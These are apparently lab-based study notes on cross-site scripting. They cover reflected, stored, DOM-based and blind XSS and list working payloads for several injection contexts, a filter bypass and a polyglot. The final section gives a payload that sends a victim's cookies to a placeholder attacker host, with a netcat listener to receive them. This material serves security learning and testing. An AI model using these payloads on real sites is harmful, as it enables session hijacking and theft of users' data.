# Types of XSS

## Reflected XSS
Reflected XSS occurs when user-supplied data in an HTTP request is included in the webpage source without proper validation or sanitization.

### Example
Consider a website that includes error messages based on URL parameters. If the error message is sourced directly from the **error** parameter, it may reflect arbitrary input into the page source:

![image](https://github.com/user-attachments/assets/c51cd7dd-d3af-49f0-bb47-b3a01c1b988a)
![image](https://github.com/user-attachments/assets/912978bd-c4a6-4510-9dfb-4bd58c7aabac)

### Potential Impact
An attacker could craft malicious URLs with JavaScript payloads, tricking users into executing the code. This can lead to session hijacking or unauthorized access to sensitive data.

### How to Test for Reflected XSS
Check all user-controllable inputs:
- URL Query Parameters
- URL Path
- HTTP Headers (less commonly exploitable)

Once reflected data is identified, test JavaScript payloads tailored to the context of injection.

## Stored XSS
Stored XSS (also known as persistent XSS) involves injecting malicious scripts that are stored on the server, typically in a database, and then displayed to users.

### Example
On a blog platform where users can comment, malicious JavaScript can be injected through comments:

![image](https://github.com/user-attachments/assets/baebddbb-a5ce-4ed0-95e3-11d3616203b7)

### How to Test for Stored XSS
Test user input points that get stored and displayed to others:
- Blog comments
- Profile fields
- Listings

Sometimes inputs are only validated client-side. Manually modifying requests can allow unexpected values like JavaScript code.

## DOM-Based XSS
DOM-Based XSS occurs when the client-side JavaScript modifies the page content based on user input without proper validation.

### What is the DOM?
The **Document Object Model** (DOM) is an interface that represents HTML documents as a tree structure, allowing programs to manipulate page content dynamically.
![image](https://github.com/user-attachments/assets/30fa52e0-ae8c-47ca-ae1c-297ffd1603c8)

### Exploiting the DOM
Occurs when JavaScript accesses user input (like `window.location.hash`) and injects it directly into the DOM:

- Example: If the content of `window.location.hash` is written to the page without sanitization.

### How to Test
Analyze client-side JavaScript for unsafe handling of variables like:
- `window.location.*`
- `document.referrer`
- `document.URL`

Identify if these values are written to the DOM or passed into functions like `eval()`.

## Blind XSS
Blind XSS occurs when the injected script executes in a context the attacker does not control or see, such as an admin panel.

### Example
Injecting JavaScript into a contact form that generates internal tickets, which are then viewed by administrators.

### How to Test
Use callbacks in your payload to detect execution. Example tools:
- [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)

This tool can collect cookies, URLs, and DOM content when the payload is executed.

# Common XSS Scenarios

### Basic Reflection
Input echoed on the page:
![image](https://github.com/user-attachments/assets/3b2840ce-fd49-4837-af3f-832cc6d123f3)
```html
<script>alert('THM');</script>
```

### Input Tag Injection
If the input is reflected in an attribute:
![image](https://github.com/user-attachments/assets/6aef0778-57f2-442c-a4a3-429f29df0178)
```html
"><script>alert('THM');</script>
```

### Textarea Tag Injection
Reflected inside `<textarea>`:
![image](https://github.com/user-attachments/assets/359bda10-6f26-4630-bb5d-f6a7bd2b3657)
```html
</textarea><script>alert('THM');</script>
```

### JavaScript Context Injection
Reflected inside JS code:
![image](https://github.com/user-attachments/assets/e27c0e22-9123-4f2f-8833-a94d271223bd)
```javascript
';alert('THM');//
```

### Filtered Keywords
When keywords like `script` are filtered:
![image](https://github.com/user-attachments/assets/fad47989-8c7a-49a0-9872-5acefaff54b7)
```html
<sscriptcript>alert('THM');</sscriptcript>
```
This is interpreted by the browser as:
```html
<script>alert('THM');</script>
```

### Bypassing IMG Tag Filters
When `<` and `>` are filtered:
![image](https://github.com/user-attachments/assets/fd86a7ab-9121-4874-b726-fd6c53dc1275)
```html
/images/cat.jpg" onload="alert('THM');
```
Using the `onload` event to execute JavaScript.

### XSS Polyglots
A polyglot is a universal payload that attempts to bypass multiple filters:
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/ -!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
Useful for broad testing but not a substitute for context-specific payloads.

# Cookie Stealing Example
To exfiltrate cookies from another user:

### 1. Setup a listening server:
```bash
nc -lnvp PORT
```

### 2. Payload:
```html
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie));</script>
```
- Closes the textarea
- Creates a fetch request to your server
- Base64-encodes the user's cookies using `btoa()`
- Sends cookies via query string

### 3. Monitor the connection
Wait for the victim to trigger the payload and monitor incoming connections.

